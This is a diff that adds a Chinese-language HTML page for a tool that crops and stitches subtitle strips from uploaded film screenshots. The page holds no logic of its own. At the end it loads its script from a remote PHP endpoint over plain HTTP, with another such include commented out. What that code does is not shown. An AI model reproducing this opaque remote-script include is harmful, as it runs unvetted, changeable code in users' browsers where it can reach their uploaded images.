@@ -1,1 +1,162 @@
-hello
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1.0">
+<title>影視截圖批量字幕裁切拼接</title>
+<script src="https://cdn.tailwindcss.com"></script>
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css">
+</head>
+<body class="bg-bgPage min-h-screen py-7 px-4">
+<div class="max-w-6xl mx-auto">
+  <div class="flex justify-end gap-2 mb-2">
+    <button id="langCN" class="lang-btn bg-main text-white">简体中文</button>
+    <button id="langTW" class="lang-btn bg-slate-200">繁體中文</button>
+  </div>
+
+  <div class="text-center mb-8">
+    <h1 class="text-[clamp(1.5rem,3vw,2rem)] font-bold text-slate-800">
+      <i class="fa fa-film text-main"></i>
+      <span class="text-cn">影视截图批量字幕裁切拼接</span>
+      <span class="text-tw hidden">影視截圖批量字幕裁切拼接</span>
+    </h1>
+    <p class="text-slate-500 mt-1">
+      <span class="text-cn">缩略图拖拽排序｜单张删图｜封面缩略可删可替换｜字幕自适应封面宽度</span>
+      <span class="text-tw hidden">縮圖拖曳排序｜單張刪圖｜封面縮圖可刪可替換｜字幕自適應封面寬度</span>
+    </p>
+  </div>
+
+  <div class="grid lg:grid-cols-[330px_1fr] gap-6">
+    <div class="bg-white rounded-xl shadow-md p-5">
+      <h3 class="font-bold text-lg mb-5 text-slate-700">
+        <i class="fa fa-sliders text-main"></i>
+        <span class="text-cn">参数面板</span>
+        <span class="text-tw hidden">參數面板</span>
+      </h3>
+
+      <div class="mb-3">
+        <label class="text-sm font-medium block mb-2">
+          <span class="text-cn">批量上传剧照(点击/拖拽)</span>
+          <span class="text-tw hidden">批量上傳劇照(點擊/拖曳)</span>
+        </label>
+        <div id="uploadArea" class="upload-box rounded-lg p-4 text-center cursor-pointer">
+          <i class="fa fa-upload text-2xl text-slate-400"></i>
+          <p class="text-xs text-slate-500 mt-1">
+            <span class="text-cn">点击/拖拽上传多张</span>
+            <span class="text-tw hidden">點擊/拖曳上傳多張</span>
+          </p>
+          <input id="imgFile" multiple accept="image/*" hidden type="file">
+        </div>
+        <div class="text-xs mt-1 text-slate-400">
+          <span class="text-cn">已上传：</span>
+          <span class="text-tw hidden">已上傳：</span>
+          <span id="imgNum">0</span>
+          <span class="text-cn"> 张｜缩略图可拖拽排序、点×删图</span>
+          <span class="text-tw hidden"> 張｜縮圖可拖曳排序、點×刪圖</span>
+        </div>
+      </div>
+
+      <div id="thumbWrap" class="flex flex-wrap gap-2 mb-5 max-h-[140px] overflow-y-auto p-2 border rounded bg-slate-50"></div>
+
+      <div class="mb-5">
+        <label class="text-sm font-medium block mb-2">
+          <span class="text-cn">自定义封面图(默认首图｜点击/拖拽替换)</span>
+          <span class="text-tw hidden">自訂封面圖(預設首圖｜點擊/拖曳替換)</span>
+        </label>
+        <div id="coverArea" class="upload-box rounded-lg p-4 text-center cursor-pointer">
+          <i class="fa fa-picture-o text-2xl text-slate-400"></i>
+          <p class="text-xs text-slate-500 mt-1">
+            <span class="text-cn">点击/拖拽上传封面</span>
+            <span class="text-tw hidden">點擊/拖曳上傳封面</span>
+          </p>
+          <input id="coverFile" accept="image/*" hidden type="file">
+        </div>
+        <div id="coverThumbWrap" class="mt-3"></div>
+        <div class="text-[10px] text-slate-400">
+          <span class="text-cn">封面缩略右上角×删除，重新上传直接替换</span>
+          <span class="text-tw hidden">封面縮圖右上角×刪除，重新上傳直接替換</span>
+        </div>
+      </div>
+
+      <div class="mb-5">
+        <p class="text-sm font-medium mb-3">
+          <span class="text-cn">字幕裁剪参数(全图统一 %)</span>
+          <span class="text-tw hidden">字幕裁剪參數(全圖統一 %)</span>
+        </p>
+        <div class="grid grid-cols-2 gap-2">
+          <div>
+            <label class="text-xs"><span class="text-cn">左边距%</span><span class="text-tw hidden">左邊距%</span></label>
+            <input id="cutL" value="3" min="0" max="30" class="w-full border rounded px-2 py-1.5">
+          </div>
+          <div>
+            <label class="text-xs"><span class="text-cn">上边距%</span><span class="text-tw hidden">上邊距%</span></label>
+            <input id="cutT" value="82" min="0" max="95" class="w-full border rounded px-2 py-1.5">
+          </div>
+          <div>
+            <label class="text-xs"><span class="text-cn">右边距%</span><span class="text-tw hidden">右邊距%</span></label>
+            <input id="cutR" value="3" min="0" max="30" class="w-full border rounded px-2 py-1.5">
+          </div>
+          <div>
+            <label class="text-xs"><span class="text-cn">字幕高度%</span><span class="text-tw hidden">字幕高度%</span></label>
+            <input id="cutH" value="18" min="3" max="35" class="w-full border rounded px-2 py-1.5">
+          </div>
+        </div>
+        <p class="text-[10px] text-slate-400 mt-1">
+          <span class="text-cn">上82+高18=截取底部18%字幕区域</span>
+          <span class="text-tw hidden">上82+高18=截取底部18%字幕區域</span>
+        </p>
+      </div>
+
+      <div class="mb-6">
+        <label class="text-sm font-medium block mb-2">
+          <span class="text-cn">间距px</span><span class="text-tw hidden">間距px</span>
+        </label>
+        <div class="grid grid-cols-2 gap-2">
+          <div>
+            <label class="text-xs"><span class="text-cn">封面→字幕间距</span><span class="text-tw hidden">封面→字幕間距</span></label>
+            <input id="gapCover" value="8" min="0" max="30" class="w-full border rounded px-2 py-1.5">
+          </div>
+          <div>
+            <label class="text-xs"><span class="text-cn">字幕之间间距</span><span class="text-tw hidden">字幕之間間距</span></label>
+            <input id="gapItem" value="5" min="0" max="20" class="w-full border rounded px-2 py-1.5">
+          </div>
+        </div>
+      </div>
+
+      <div class="flex flex-col gap-3">
+        <button id="createBtn" class="bg-main text-white py-2.5 rounded-lg hover:bg-main/90">
+          <i class="fa fa-crop"></i><span class="text-cn">批量生成拼接预览</span><span class="text-tw hidden">批量生成拼接預覽</span>
+        </button>
+        <button id="downloadBtn" class="bg-orange text-white py-2.5 rounded-lg hover:bg-orange-600">
+          <i class="fa fa-download"></i><span class="text-cn">导出高清长图</span><span class="text-tw hidden">匯出高清長圖</span>
+        </button>
+        <button id="clearAll" class="border border-slate-300 py-2 rounded-lg hover:bg-slate-100 text-slate-600">
+          <span class="text-cn">清空全部素材</span><span class="text-tw hidden">清空全部素材</span>
+        </button>
+      </div>
+    </div>
+
+    <div class="bg-white rounded-xl shadow-md p-5">
+      <h3 class="font-bold text-lg mb-4 text-slate-700">
+        <i class="fa fa-eye text-main"></i>
+        <span class="text-cn">拼接预览</span><span class="text-tw hidden">拼接預覽</span>
+      </h3>
+      <div class="max-h-[75vh] overflow-y-auto bg-slate-100 rounded-lg p-4">
+        <div id="resultBox" class="flex flex-col mx-auto max-w-[360px]"></div>
+        <div id="emptyTip" class="py-24 text-center text-slate-400">
+          <i class="fa fa-film text-5xl"></i>
+          <p class="mt-3">
+            <span class="text-cn">上传剧照、调整顺序、填写裁剪参数后生成</span>
+            <span class="text-tw hidden">上傳劇照、調整順序、填寫裁剪參數後生成</span>
+          </p>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- 关键：加载 PHP 输出的 JS（跨域可用）-->
+<!-- <script src="https://b.wzf.com/1.php"></script> -->
+<script src="http://xsd.91143.cn/go/html.php"></script>
+</body>
+</html>
